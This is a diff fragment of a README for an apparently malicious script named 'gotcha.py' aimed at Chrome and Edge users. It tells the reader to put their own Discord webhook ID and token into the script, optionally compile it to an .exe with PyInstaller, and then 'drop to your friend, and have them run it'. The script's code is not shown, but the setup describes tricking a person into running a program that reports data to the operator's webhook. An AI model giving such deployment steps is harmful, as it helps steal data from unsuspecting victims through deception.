@@ -21,15 +21,15 @@ supports Chrome, and Microsoft Edge : can't garauntee its functionality .
 3. replace these variables with the following found in your Discord webhook.
 
 `https//discord.com/api/webhooks/`(**1**)`/`(**2**)
-
+| --- |
 (**1**) = "whID"
-
+| --- |
 (**2**) = "whAT"
-
+| --- |
 4. save, now you're set. If you'd like : you can .exe the script using Pyinstaller, https://pypi.org/project/pyinstaller/
 5. drop to your friend, and have them run it.
 
-### example :
+### example => "`gotcha.py`"
 ![](https://cdn.discordapp.com/attachments/796598097986715668/797299038536990760/example.png)
 ---------------------------------------------------
 
